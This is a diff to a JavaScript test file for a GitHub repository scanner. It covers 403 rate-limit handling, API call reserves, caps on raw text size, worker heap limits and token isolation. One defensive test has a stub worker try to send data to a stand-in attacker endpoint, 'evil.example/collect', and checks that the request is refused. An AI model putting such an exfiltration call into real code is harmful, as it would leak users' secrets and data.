@@ -14,7 +14,7 @@ import {
   FORMAT, KNOWN_ANSWER_FILE, MARKER_RE, MAX_ITEMS, MAX_ITEMS_CHARS, PERMANENT, RESULT_PATH, SKIP_REASON, TRANSIENT, skipReasonFor,
   InputProblem, buildBundle, forgeryControl, isDateTime, knownAnswerControl, knownAnswerFile, main, observationsOf,
   parseInputs, runShard, scanSubject, settingsDigest,
-  RAW_FILE_CAP, fixtureFetch, httpDetail, jsonUpTo, knownAnswer, notRead, rawText, readDetail, reportItem, scanInWorker, writeItem,
+  RAW_FILE_CAP, CALLS_PER_SUBJECT, RATE_RESERVE, SUBJECT_HEAP_MB, fixtureFetch, httpDetail, jsonUpTo, knownAnswer, notRead, rawText, readDetail, reportItem, scanInWorker, writeItem,
 } from '../corpus/scan-static.mjs';
 import * as guard from '../corpus/loop-guard.mjs';
 // tool-qa's own result contract and ingest checks, at the commit WORKER_KIT_REF pins (test/tool-qa/README.md).
@@ -714,7 +714,7 @@ test('R-SS-04: the known-answer fixture is also read through fromGitHub, from a 
   assert.equal((await f('https://example.com/')).status, 404);
 });
 
-test('R-SS-07: a 403 is a rate limit only when GitHub says so; otherwise the repository is refused, for good', () => {
+test('R-SS-07: a 403 is a rate limit only when GitHub says so; a repository the API refuses is refused for good', () => {
   const h = (o) => (k) => (k in o ? o[k] : null);
   assert.equal(httpDetail(403, h({ 'x-ratelimit-remaining': '0' }), ''), 'rate_limited');
   assert.equal(httpDetail(403, h({ 'retry-after': '60' }), ''), 'rate_limited');
@@ -724,8 +724,9 @@ test('R-SS-07: a 403 is a rate limit only when GitHub says so; otherwise the rep
   const e403 = Object.assign(new Error('HTTP 403'), { status: 403, code: 'rate_limited' });
   assert.equal(readDetail(e403, false, { status: 403, remaining: '0', retryAfter: null }), 'rate_limited');
   assert.equal(readDetail(e403, false, { status: 403, remaining: null, retryAfter: '30' }), 'rate_limited');
-  assert.equal(readDetail(e403, false, { status: 403, remaining: '4000', retryAfter: null }), 'repo_unavailable');
-  assert.equal(readDetail(e403, false, null), 'repo_unavailable');
+  // An unexplained 403 from the reader (tree or raw file) is retryable and bounded (R-SS-09).
+  assert.equal(readDetail(e403, false, { status: 403, remaining: '4000', retryAfter: null }), 'upstream_error');
+  assert.equal(readDetail(e403, false, null), 'upstream_error');
   assert.equal(readDetail({ status: 429 }, false, null), 'rate_limited');
   assert.ok(PERMANENT.includes('repo_unavailable'));
 });
@@ -747,4 +748,74 @@ test('R-SS-07: a shard stops before the API budget runs dry, with retryable skip
   assert.deepEqual(r.items.map((x) => [x.status, x.detail]), [['graded', null], ['skipped', 'rate_limited'], ['skipped', 'rate_limited'], ['skipped', 'rate_limited']]);
   const meta = JSON.parse(readFileSync(join(out, '1', 'meta.json'), 'utf8'));
   assert.deepEqual(meta.skips, [{ stage: 'static', reason: 'rate_limited', evidence: RESULT_PATH, retryable: true }]);
+});
+
+test('R-SS-08: a subject\'s thread caps its raw/ texts before posting them, and runs under a heap limit', async () => {
+  const files = sharedConstantRepo(5000);
+  const t0 = performance.now();
+  const scan = await scanInWorker('o/shared', { fetch: fakeGithub({ 'o/shared': { files } }), timeoutMs: 60_000 });
+  assert.ok(performance.now() - t0 < 60_000);
+  assert.notEqual(scan.detail, 'reader_error', 'the 5,000 tools reach the parent, cut');
+  assert.deepEqual(scan.raw, {}, 'no uncapped raw value crosses threads');
+  const tools = scan.rawFiles.files['raw/subject/tools.json'];
+  assert.ok(Buffer.byteLength(tools) <= RAW_FILE_CAP);
+  assert.deepEqual([JSON.parse(tools).truncated, JSON.parse(tools).total], [true, 5000]);
+  assert.deepEqual(scan.rawFiles.truncated, ['raw/subject/tools.json']);
+  // The bundle uses those texts as they are.
+  const item = { index: 0, subject: 'o/shared', repo: 'o/shared', run_key: key(0), fence: 10 };
+  const { files: bundle } = buildBundle({ item, scan, controls: [], startedAt: DATE, finishedAt: DATE });
+  assert.equal(bundle['raw/subject/tools.json'], tools);
+  assert.deepEqual(JSON.parse(bundle[RESULT_PATH]).raw_truncated, ['raw/subject/tools.json']);
+  // The thread's heap limit.
+  const peek = new URL('data:text/javascript,' + encodeURIComponent("import v8 from 'node:v8'; import { parentPort } from 'node:worker_threads'; parentPort.postMessage({ type: 'done', out: { status: 'skipped', detail: String(v8.getHeapStatistics().heap_size_limit), raw: {} } });"));
+  const limit = Number((await scanInWorker('o/r', { fetch: fakeGithub({}), workerUrl: peek })).detail);
+  assert.equal(SUBJECT_HEAP_MB, 1536);
+  assert.ok(limit > 1400 * 1024 ** 2 && limit < 1800 * 1024 ** 2, String(limit));
+});
+
+test('R-SS-09: a 403 from the reader is a rate limit when its body says so; an unexplained one is retryable', async () => {
+  const limited = res(403, '{"message":"You have exceeded a secondary rate limit. Please wait a few minutes."}');
+  const plain = res(403, '{"message":"Forbidden"}');
+  for (const [body, detail] of [[limited, 'rate_limited'], [plain, 'upstream_error']]) {
+    const base = fakeGithub({ 'o/r': { files: jsLiteral } });
+    const fetch = async (url, init) => (String(url).startsWith('https://raw.githubusercontent.com/') ? { ...body, clone: () => ({ text: body.text }) } : base(url, init));
+    const s = await scanSubject('o/r', { fetch });
+    assert.equal(s.detail, detail);
+    assert.equal(s.retryable, true);
+  }
+});
+
+test('R-SS-09: the shard stops only when fewer than one subject\'s calls plus a reserve are left', async () => {
+  assert.deepEqual([CALLS_PER_SUBJECT, RATE_RESERVE], [3, 10]);
+  const names = Array.from({ length: 10 }, (_, i) => 'o/s' + i);
+  const fetch = fakeGithub(Object.fromEntries(names.map((n) => [n, { files: jsLiteral }])));
+  let remaining = 25;
+  const counted = async (url, init) => {
+    const r = await fetch(url, init);
+    if (!String(url).startsWith('https://api.github.com/')) return r;
+    remaining -= 1;
+    const get = r.headers.get;
+    return { ...r, headers: { get: (k) => (k.toLowerCase() === 'x-ratelimit-remaining' ? String(remaining) : get(k)) } };
+  };
+  const out = join(tmp('reserve'), 'out');
+  const r = await runShard({ shardId: 's', attemptId: 'att-1', items: itemsOf(names), out, fetch: counted });
+  // 25, 22, 19, 16 and 13 left before the first five: read. 10 left: under 3 + 10, the rest wait.
+  assert.deepEqual(r.items.map((x) => x.detail), [null, null, null, null, null, 'rate_limited', 'rate_limited', 'rate_limited', 'rate_limited', 'rate_limited']);
+});
+
+test('R-SS-10: the token stays in the parent, goes to api.github.com only, and a thread reaches no other host', async () => {
+  const calls = [];
+  const scan = await scanInWorker('o/a', { fetch: fakeGithub({ 'o/a': { files: jsLiteral } }, calls), token: TOKEN });
+  assert.equal(scan.status, 'graded');
+  for (const c of calls) {
+    if (c.url.startsWith('https://api.github.com/')) assert.equal(c.auth, 'Bearer ' + TOKEN, c.url);
+    else assert.equal(c.auth, null, c.url);
+  }
+  const src = "import { parentPort, workerData } from 'node:worker_threads';"
+    + "parentPort.on('message', (m) => parentPort.postMessage({ type: 'done', out: { status: 'skipped', detail: (m.error ? m.error.name : 'answered') + ' ' + JSON.stringify(Object.keys(workerData)), raw: {} } }));"
+    + "parentPort.postMessage({ type: 'fetch', id: 1, url: 'https://evil.example/collect', headers: {} });";
+  const asked = [];
+  const out = await scanInWorker('o/r', { fetch: async (u) => { asked.push(u); return res(200, '{}'); }, token: TOKEN, workerUrl: new URL('data:text/javascript,' + encodeURIComponent(src)) });
+  assert.equal(out.detail, 'RefusedHost ["subject","timeoutMs"]', 'refused, and no token in the thread');
+  assert.deepEqual(asked, []);
 });
